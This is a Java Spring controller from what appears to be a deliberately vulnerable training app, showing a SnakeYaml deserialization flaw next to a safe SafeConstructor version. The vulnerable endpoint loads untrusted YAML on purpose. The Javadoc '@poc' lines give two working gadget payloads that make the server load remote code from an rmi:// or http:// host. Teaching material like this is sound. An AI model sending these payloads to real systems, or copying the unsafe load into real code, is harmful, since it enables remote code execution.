package com.best.hello.controller.Deserialization;

import io.swagger.annotations.ApiOperation;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.yaml.snakeyaml.Yaml;
import org.yaml.snakeyaml.constructor.SafeConstructor;


@RestController
@RequestMapping("/vulnapi/Deserialization/SnakeYaml")
public class SnakeYamlVul {
    Logger log = LoggerFactory.getLogger(SnakeYamlVul.class);

    /**
     * @poc content=!!com.sun.rowset.JdbcRowSetImpl {dataSourceName: 'rmi://127.0.0.1:2222/exp', autoCommit: true}
     * @poc content=!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://127.0.0.1:2222"]]]]
     */
    @ApiOperation(value = "vul：SnakeYaml 反序列化漏洞")
    @PostMapping("/vul")
    public void vul(String content) {
        Yaml y = new Yaml();
        y.load(content);
        log.info("[vul] SnakeYaml反序列化: {}", content);
    }

    @ApiOperation(value = "safe：SnakeYaml")
    @PostMapping("/safe")
    public void safe(String content) {
        // SafeConstructor 是 SnakeYaml 提供的一个安全的构造器。它可以用来构造安全的对象，避免反序列化漏洞的发生。
        try {
            Yaml y = new Yaml(new SafeConstructor());
            y.load(content);
            log.info("[safe] SnakeYaml反序列化: {}", content);
        } catch (Exception e) {
            log.warn("[error] SnakeYaml反序列化失败", e);
        }

    }

}
